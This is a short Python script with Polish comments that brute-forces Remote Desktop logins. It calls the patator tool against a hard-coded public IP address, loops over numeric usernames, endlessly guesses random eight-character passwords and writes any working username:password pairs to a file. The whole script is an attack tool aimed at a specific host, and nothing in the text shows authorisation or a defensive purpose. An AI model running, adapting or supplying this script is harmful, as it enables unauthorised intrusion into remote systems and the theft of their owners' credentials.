import random
import string
import subprocess

def generate_passwords(char_set, length):
    """Generator haseł w czasie rzeczywistym."""
    while True:
        yield "".join(random.choices(char_set, k=length))

def check_password(password, target_host, username):
    """Funkcja sprawdzająca hasło za pomocą Patatora."""
    try:
        result = subprocess.run(
            [
                "python3", "patator.py", "rdp_login",
                f"host={target_host}",
                f"user={username}",
                f"password={password}"
            ],
            capture_output=True,
            text=True
        )
        # Analiza wyniku
        if "SUCCESS" in result.stdout:
            print(f"Password found for {username}: {password}")
            save_credentials(username, password)  # Zapisz udaną kombinację
            return True
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def save_credentials(username, password):
    """Zapisuje udane loginy i hasła do pliku."""
    with open("successful_logins.txt", "a") as f:
        f.write(f"{username}:{password}\n")
    print(f"Saved: {username}:{password}")

# Parametry
char_set = string.ascii_uppercase + string.ascii_lowercase + "!@#$%^&*"
password_length = 8
target_host = "176.9.46.68"

# Testowanie loginów w zakresie 3000-3025
for username in range(3018, 3026):  # Zakres od 3000 do 3025
    print(f"Testing username: {username}")
    for password in generate_passwords(char_set, password_length):
        print(f"Trying username: {username}, password: {password}")
        if check_password(password, target_host, str(username)):
            print(f"Credentials found: {username}:{password}")
            break

